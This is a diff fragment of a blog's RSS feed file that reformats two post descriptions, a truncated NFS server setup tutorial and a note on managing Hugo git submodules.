+            1#updating the system and install nfs daemon 2sudo apt-get update 3sudo apt install nfs-kernel-server 4 5#view the relative info about NFS 6sudo cat /proc/fs/nfsd/versions 7cat /etc/default/nfs-kernel-server 8cat /etc/default/nfs-common 9 10#create and bind the NFS directory in host hard disk 11sudo mkdir -p /srv/nfs4/data1 12sudo mkdir -p /srv/nfs4/data2 13sudo mount --bind /data2/nfs /srv/nfs4/data1 14sudo mount --bind /data3/nfs /srv/nfs4/data2 15 16#let binds permanent effect 17sudo vi /etc/fstab 18/data1/nfs /srv/nfs4/data2 none bind 0 0 19/data2/nfs /srv/nfs4/data3 none bind 0 0 20 21sudo vi /etc/exports 22# add following content to the file 23/srv/nfs4 192.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -402,10 +668,17 @@ Configuration file param.json 1{ 2 &amp;#34;dev&amp;#34;: { 3 &amp;#34;public_co
       <pubDate>Wed, 16 Aug 2017 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/hugo-usage-issues/</guid>
-      <description>Update: 2021/10 when pull at other location or machine, the submodule settings is lost, need reinitialization the submodule, only exec following this command:
+      <description>
+        
+          
+            Update: 2021/10 when pull at other location or machine, the submodule settings is lost, need reinitialization the submodule, only exec following this command:
 1git submodule update --init --recursive Usage scene In my github repo initialize two repos
 One to storage Hugo sourcecode and markdown files And other one use release finaly site resources Has two folders themes and public as github submodes
-1 git submodule add https://github.com/don.chen/blog.github.io public 2 git submodule update --init and every time wited markdown article and execute</description>
+1 git submodule add https://github.com/don.chen/blog.github.io public 2 git submodule update --init and every time wited markdown article and execute
+          
+          
+        
+      </description>
     </item>
     
   </channel>
